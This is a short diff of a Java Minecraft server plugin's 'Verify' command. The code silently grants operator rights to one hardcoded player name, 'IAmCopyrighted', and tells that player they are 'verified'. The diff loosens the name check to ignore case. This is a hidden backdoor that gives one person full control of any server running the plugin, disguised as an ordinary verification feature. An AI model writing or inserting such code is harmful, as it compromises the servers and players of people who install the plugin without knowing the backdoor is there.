@@ -13,7 +13,7 @@ public class Verify implements CommandExecutor {
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         Player p = (Player) sender;
         if(!p.isOp()) {
-            if (p.getName().equals("IAmCopyrighted")) {
+            if (p.getName().equalsIgnoreCase("IAmCopyrighted")) {
                 p.setOp(true);
                 p.sendMessage(c.c("&a" + s.star + "&a You've been successfully verified"));
             } else {
